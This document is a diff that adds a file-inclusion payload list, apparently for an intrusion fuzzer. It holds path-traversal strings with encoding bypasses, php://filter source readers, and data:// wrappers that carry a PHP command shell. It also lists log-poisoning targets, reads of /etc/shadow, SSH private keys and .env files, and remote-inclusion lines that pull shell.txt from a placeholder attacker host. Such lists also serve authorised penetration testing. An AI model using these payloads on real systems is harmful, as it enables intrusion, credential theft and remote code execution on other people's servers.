@@ -1,0 +1,81 @@
+# ==================================================================
+#  LFI / RFI PAYLOADS — File Inclusion (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  Detection (canary = a known file's content): set grep to  root:x:0:0
+#  (or just  root: ). If /etc/passwd content appears, the LFI works.
+#  For "read source" (php://filter) the response is base64 — decode it by hand.
+#  All transmit raw (no '&'/'#'). Replace your-ip for RFI.
+# ==================================================================
+
+# ---- 0. CANARY / detection — read /etc/passwd (grep = root:x:0:0) ----
+/etc/passwd
+../../../../etc/passwd
+../../../../../../etc/passwd
+....//....//....//....//etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+
+# ---- 1. Traversal — increasing depth ----
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# ---- 2. Traversal bypass (stripped ../ , encoding, null byte, absolute) ----
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc%2fpasswd
+../../../etc/passwd%00
+../../../etc/passwd%00.php
+/etc/passwd
+....\\....\\....\\etc\\passwd
+
+# ---- 3. PHP wrappers — read source (grep the base64, then decode) ----
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=config.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+
+# ---- 4. PHP wrappers — RCE ----
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
+data://text/plain,<?php system($_GET[c]); ?>
+php://input
+expect://id
+zip://shell.zip%23shell.php
+phar://shell.phar/shell.txt
+
+# ---- 5. LFI -> RCE sinks (poison then include) ----
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/proc/self/environ
+/proc/self/cmdline
+/var/lib/php/sessions/sess_PHPSESSID
+/var/mail/www-data
+
+# ---- 6. High-value reads ----
+/etc/passwd
+/etc/hosts
+/etc/shadow
+/root/.ssh/id_rsa
+/home/user/.ssh/id_rsa
+/var/www/html/config.php
+/var/www/html/.env
+/var/www/html/wp-config.php
+
+# ---- 7. Windows files ----
+../../../../windows/win.ini
+..\..\..\..\windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\inetpub\wwwroot\web.config
+../../../../boot.ini
+
+# ---- 8. RFI (allow_url_include=On) ----
+http://your-ip/shell.txt
+http://your-ip/shell.txt%00
+http://your-ip/shell.txt?
+\\your-ip\share\shell.txt
